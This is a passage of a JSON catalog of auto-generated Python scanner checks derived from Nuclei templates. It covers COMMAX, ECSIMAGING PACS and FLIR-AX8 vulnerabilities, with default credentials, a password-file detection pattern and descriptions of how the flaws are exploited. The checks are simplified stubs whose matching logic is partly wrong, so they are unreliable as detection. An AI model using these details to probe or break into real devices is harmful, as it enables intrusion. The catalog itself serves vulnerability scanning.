check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '<title>::: COMMAX :::</title>' | mot(s) 'text/html' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['<title>::: COMMAX :::</title>', 'text/html']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_commax_biometric_auth_bypass(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "commax",
          "auth-bypass",
          "edb",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_commax_credentials_disclosure",
        "name": "COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure",
        "language": "Python",
        "famille": "Exposure",
        "description": "The COMMAX CCTV Bridge for the DVR service allows an unauthenticated attacker to disclose real time streaming protocol (RTSP) credentials in plain-text.",
        "severity": "critical",
        "detection": "[OR] mot(s) 'DVR Lists, rtsp://, login_check.js'",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: commax-credentials-disclosure\nName: COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure\nSeverity: critical\nDescription: The COMMAX CCTV Bridge for the DVR service allows an unauthenticated attacker to disclose real time streaming protocol (RTSP) credentials in plain-text.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_commax_credentials_disclosure:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"commax-credentials-disclosure\"\n    SEVERITY = \"critical\"\n    NAME = \"COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'DVR Lists, rtsp://, login_check.js'\"\n\n        # Simple word matcher simulation\n        matchers = ['DVR Lists, rtsp://, login_check.js']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_commax_credentials_disclosure(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: commax-credentials-disclosure\nName: COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure\nSeverity: critical\nDescription: The COMMAX CCTV Bridge for the DVR service allows an unauthenticated attacker to disclose real time streaming protocol (RTSP) credentials in plain-text.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_commax_credentials_disclosure:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"commax-credentials-disclosure\"\n    SEVERITY = \"critical\"\n    NAME = \"COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[OR] mot(s) 'DVR Lists, rtsp://, login_check.js'\"\n\n        # Simple word matcher simulation\n        matchers = ['DVR Lists, rtsp://, login_check.js']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"COMMAX Smart Home Ruvie CCTV Bridge DVR - RTSP Credentials Disclosure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_commax_credentials_disclosure(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "commax",
          "exposure",
          "camera",
          "iot",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_ecsimagingpacs_rce",
        "name": "ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion",
        "language": "Python",
        "famille": "WebApp",
        "description": "ECSIMAGING PACS Application 6.21.5 and below suffer from a command injection vulnerability and a local file include vulnerability. The 'file' parameter on the page /showfile.php can be exploited to perform command execution or local file inclusion. Often on ECSIMAGING PACS, the www-data user has sudo NOPASSWD access.",
        "severity": "critical",
        "detection": "[AND] regex ['root:.*:0:0:'] | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ecsimagingpacs-rce\nName: ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion\nSeverity: critical\nDescription: ECSIMAGING PACS Application 6.21.5 and below suffer from a command injection vulnerability and a local file include vulnerability. The 'file' parameter on the page /showfile.php can be exploited to perform command execution or local file inclusion. Often on ECSIMAGING PACS, the www-data user has sudo NOPASSWD access.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ecsimagingpacs_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ecsimagingpacs-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ecsimagingpacs_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ecsimagingpacs-rce\nName: ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion\nSeverity: critical\nDescription: ECSIMAGING PACS Application 6.21.5 and below suffer from a command injection vulnerability and a local file include vulnerability. The 'file' parameter on the page /showfile.php can be exploited to perform command execution or local file inclusion. Often on ECSIMAGING PACS, the www-data user has sudo NOPASSWD access.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ecsimagingpacs_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ecsimagingpacs-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['root:.*:0:0:'] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"ECSIMAGING PACS <= 6.21.5 - Command Execution and Local File Inclusion\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ecsimagingpacs_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "ecsimagingpacs",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_flir_ax8_rce",
        "name": "FLIR-AX8 res.php - Remote Code Execution",
        "language": "Python",
        "famille": "IoT",
        "description": "Remote Command Execution vulnerability in the FLIR-AX8 res.php file, the attacker obtains server permissions after logging in to the background with the default password.",
        "severity": "critical",
        "detection": "[AND] DSL: contains_all(to_lower(header_1), 'text/html','phpsessid','showcameraid'); contains(body_1, 'success') | regex ['uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "admin"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "admin"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
